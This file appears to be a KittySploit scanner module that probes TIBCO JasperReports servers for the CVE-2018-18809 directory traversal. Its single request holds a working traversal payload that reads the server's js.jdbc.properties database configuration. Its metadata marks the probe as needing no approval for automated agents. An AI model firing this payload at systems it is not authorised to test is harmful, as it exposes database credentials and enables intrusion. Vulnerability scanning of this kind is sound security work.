#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The default server implementation of TIBCO Software Inc."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TIBCO JasperReports Library - Directory Traversal Detection',
        'description': "The default server implementation of TIBCO Software Inc.'s TIBCO JasperReports Library, TIBCO JasperReports Library Community Edition, TIBCO JasperReports Library for ActiveMatrix BPM, TIBCO JasperReports Server, TIBCO JasperReports Server Community Edition, TIBCO JasperReports Server for ActiveMatrix BPM, TIBCO Jaspersoft for AWS with Multi-Tenancy, and TIBCO Jaspersoft Reporting and Analytics for AWS contains a directory-traversal vulnerability that may theoretically allow web server users to access contents of the host system.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'packetstorm', 'seclists', 'lfi', 'kev', 'jasperserver', 'jasperreport', 'tibco', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/154406/Tibco-JasperSoft-Path-Traversal.html',
            'https://security.elarlang.eu/cve-2018-18809-path-traversal-in-tibco-jaspersoft.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-18809',
            'http://packetstormsecurity.com/files/154406/Tibco-JasperSoft-Path-Traversal.html',
            'http://seclists.org/fulldisclosure/2019/Sep/17',
        ],
        'cve': 'CVE-2018-18809',
    }

    def run(self):
        r = self.http_request(method="GET", path='/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('metadata.jdbc.driverClassName', 'metadata.hibernate.dialect',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="TIBCO JasperReports Library - Directory Traversal detected",
                path='/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../js.jdbc.properties',
            )
            return True
        return False

